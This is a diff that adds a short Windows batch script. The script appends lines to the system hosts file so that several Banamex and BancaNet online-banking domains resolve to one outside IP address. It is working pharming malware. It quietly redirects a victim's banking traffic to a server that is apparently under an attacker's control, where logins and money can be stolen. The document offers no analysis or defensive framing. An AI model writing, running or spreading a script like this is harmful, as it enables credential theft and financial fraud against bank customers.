@@ -1,0 +1,12 @@
+@echo off
+echo 208.85.178.74  banamex.com >> %windir%\system32\drivers\etc\hosts
+echo 208.85.178.74  www.banamex.com >> %windir%\system32\drivers\etc\hosts
+echo 208.85.178.74  www.banamex.com.mx >> %windir%\system32\drivers\etc\hosts
+echo 208.85.178.74  banamex.com.mx >> %windir%\system32\drivers\etc\hosts
+echo 208.85.178.74  boveda.banamex.com.mx >> %windir%\system32\drivers\etc\hosts
+echo 208.85.178.74  www.boveda.banamex.com.mx >> %windir%\system32\drivers\etc\hosts
+echo 208.85.178.74  www.bancanetempresarial.banamex.com.mx >> %windir%\system32\drivers\etc\hosts
+echo 208.85.178.74  bancanetempresarial.banamex.com.mx >> %windir%\system32\drivers\etc\hosts
+echo 208.85.178.74  www.bancanet.com >> %windir%\system32\drivers\etc\hosts
+echo 208.85.178.74  bancanet.com >> %windir%\system32\drivers\etc\hosts
+exit
